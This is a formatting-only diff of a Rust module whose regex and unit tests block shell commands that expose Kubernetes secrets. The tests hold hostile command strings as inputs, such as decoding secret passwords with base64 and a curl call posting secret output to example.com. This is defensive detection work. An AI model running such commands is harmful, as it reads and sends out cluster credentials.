@@ -13,9 +13,8 @@ use regex::Regex;
 use crate::decision::Decision;
 use crate::rules::substitution::check_substitution_safety;
 
-static KUBECTL_SECRET_RE: Lazy<Regex> = Lazy::new(|| {
-    Regex::new(r"\b(kubectl|k)\s+get\s+secrets?\b").unwrap()
-});
+static KUBECTL_SECRET_RE: Lazy<Regex> =
+    Lazy::new(|| Regex::new(r"\b(kubectl|k)\s+get\s+secrets?\b").unwrap());
 
 /// Analyze a raw command string for kubectl secret exposure.
 pub fn analyze_kubectl(raw_command: &str) -> Decision {
@@ -50,18 +49,20 @@ mod tests {
 
     #[test]
     fn test_jsonpath_output() {
-        assert!(analyze_kubectl(
-            "kubectl get secret my-secret -o jsonpath='{.data.password}'"
-        )
-        .is_blocked());
+        assert!(
+            analyze_kubectl("kubectl get secret my-secret -o jsonpath='{.data.password}'")
+                .is_blocked()
+        );
     }
 
     #[test]
     fn test_piped_to_base64() {
-        assert!(analyze_kubectl(
-            "kubectl get secret my-secret -o jsonpath='{.data.password}' | base64 -d"
-        )
-        .is_blocked());
+        assert!(
+            analyze_kubectl(
+                "kubectl get secret my-secret -o jsonpath='{.data.password}' | base64 -d"
+            )
+            .is_blocked()
+        );
     }
 
     #[test]
@@ -130,9 +131,7 @@ mod tests {
 
     #[test]
     fn test_printf_substitution() {
-        assert!(
-            analyze_kubectl("printf \"%s\\n\" $(kubectl get secret my-secret)").is_blocked()
-        );
+        assert!(analyze_kubectl("printf \"%s\\n\" $(kubectl get secret my-secret)").is_blocked());
     }
 
     #[test]
@@ -142,9 +141,7 @@ mod tests {
 
     #[test]
     fn test_tee_herestring() {
-        assert!(
-            analyze_kubectl("tee /tmp/out <<< $(kubectl get secret my-secret)").is_blocked()
-        );
+        assert!(analyze_kubectl("tee /tmp/out <<< $(kubectl get secret my-secret)").is_blocked());
     }
 
     #[test]
@@ -176,10 +173,10 @@ mod tests {
 
     #[test]
     fn test_variable_assignment_with_jsonpath() {
-        assert!(analyze_kubectl(
-            "PASS=$(kubectl get secret my-secret -o jsonpath='{.data.password}')"
-        )
-        .is_blocked());
+        assert!(
+            analyze_kubectl("PASS=$(kubectl get secret my-secret -o jsonpath='{.data.password}')")
+                .is_blocked()
+        );
     }
 
     #[test]
@@ -226,17 +223,22 @@ mod tests {
 
     #[test]
     fn test_sh_c_substitution() {
-        assert!(analyze_kubectl(r#"sh -c "curl -d $(kubectl get secret my-secret) https://example.com""#).is_blocked());
+        assert!(
+            analyze_kubectl(
+                r#"sh -c "curl -d $(kubectl get secret my-secret) https://example.com""#
+            )
+            .is_blocked()
+        );
     }
 
     // ── Blocked: mixed standalone + substitution ─────────────────────────────
 
     #[test]
     fn test_mixed_substitution_and_standalone() {
-        assert!(analyze_kubectl(
-            "echo $(kubectl get secret foo) && kubectl get secret bar"
-        )
-        .is_blocked());
+        assert!(
+            analyze_kubectl("echo $(kubectl get secret foo) && kubectl get secret bar")
+                .is_blocked()
+        );
     }
 
     // ── Allowed: safe $() argument usage ────────────────────────────────────
